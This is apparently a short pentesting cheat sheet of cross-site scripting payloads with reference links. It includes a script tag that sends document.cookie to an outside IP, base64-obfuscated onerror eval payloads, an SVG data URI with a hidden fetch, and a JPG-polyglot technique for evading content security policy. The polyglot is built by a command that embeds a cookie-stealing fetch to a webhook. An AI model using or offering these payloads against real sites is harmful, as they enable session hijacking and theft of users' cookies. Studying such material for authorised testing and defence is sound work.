# XSS
## Resources
- [Hacktricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [Pipedream (webhooks)](https://pipedream.com/)
- [CSP evasion with dangling markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)
- [Portswigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## Injections

```html
<script>fetch("http://1.1.1.1/?cookie="+document.cookie);</script>
```
```html
<img src=x onerror='eval(atob(\"ZmV0Y2goJ3BpcGVkcmVhbS90ZXN0MScp\"))' />
```
```html
<img src="data:image/svg+xml,<svg onload=alert('XSS')></svg>">
```
```html
data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4NCiAgPGNpcmNsZSByPSIxMCIgY3g9IjEwIiBjeT0iMTAiIGZpbGw9ImdyZWVuIi8+DQogIDxpbWFnZSBocmVmPSJ4IiBvbmVycm9yPSJqYXZhc2NyaXB0OmZldGNoKCdzb21ldGhpbmcnKSIgLz4NCjwvc3ZnPg0K
```

## JPG CSP Evasion 
- [CSP evasion with JPG polyglot](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs)
- [XSS JPG polyglot](https://infosecwriteups.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a)
- [img_polygloter.py](https://github.com/s-3ntinel/imgjs_polygloter)

```bash
python img_polygloter.py jpg --height 120 --width 120 --payload 'fetch("https://webhook.xxx/c="+document.cookie);' --output payload.jpg
```
```html
<script charset="ISO-8859-1" type="text/javascript" src="/the/image/w/payload.jpg"></script>
```